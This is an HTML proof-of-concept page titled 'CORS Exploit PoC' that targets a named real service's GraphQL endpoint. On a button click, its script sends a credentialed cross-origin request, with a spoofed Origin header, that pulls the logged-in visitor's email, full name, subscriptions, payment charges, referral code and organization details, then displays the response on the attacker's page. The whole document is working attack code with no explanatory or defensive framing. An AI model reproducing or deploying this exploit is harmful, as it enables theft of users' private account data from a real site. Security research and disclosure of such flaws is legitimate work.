<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Exploit PoC</h1>
    <button id="exploitButton">Exploit</button>
    <pre id="response"></pre>

    <script>
        document.getElementById('exploitButton').onclick = function() {
            // Data to retrieve current user info
            const payload = {
                operationName: "CurrentUser",
                variables: {},
                query: `query CurrentUser {
                    currentUser {
                        uuid
                        avatarHref
                        email
                        examCredits
                        fakeName
                        fullName
                        nickname
                        promo
                        referralCode
                        activeProductSlug
                        onboardedAt
                        organizationUuid
                        source
                        termsAt
                        grants {
                            scope
                            targetType
                            targetUuid
                            __typename
                        }
                        subscriptions {
                            uuid
                            productUuid
                            status
                            createdAt
                            expiresAt
                            charge {
                                uuid
                                refundedAt
                                __typename
                            }
                            product {
                                uuid
                                shortName
                                slug
                                studyPlan {
                                    uuid
                                    status
                                    __typename
                                }
                                __typename
                            }
                            sliceSubscription {
                                uuid
                                slice {
                                    uuid
                                    __typename
                                }
                                __typename
                            }
                            __typename
                        }
                        organization {
                            uuid
                            name
                            slug
                            logoHref
                            logoDarkHref
                            __typename
                        }
                        __typename
                    }
                }`
            };

            // Create XMLHttpRequest
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.achievable.me/graphql', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('Origin', 'https://xr0r.github.io/lol/exploit.html');

            // Handle response
            xhr.onload = function() {
                const responseElement = document.getElementById('response');
                if (xhr.status === 200) {
                    responseElement.innerText = `Status: ${xhr.status}\nResponse: ${xhr.responseText}\nCORS headers: ${xhr.getAllResponseHeaders()}`;
                } else {
                    responseElement.innerText = 'Failed to retrieve user information';
                }
            };

            // Handle network errors
            xhr.onerror = function() {
                document.getElementById('response').innerText = 'Network error occurred';
            };

            // Send request with credentials
            xhr.withCredentials = true; // Ensure cookies are sent with the request
            xhr.send(JSON.stringify(payload));
        };
    </script>
</body>
</html>
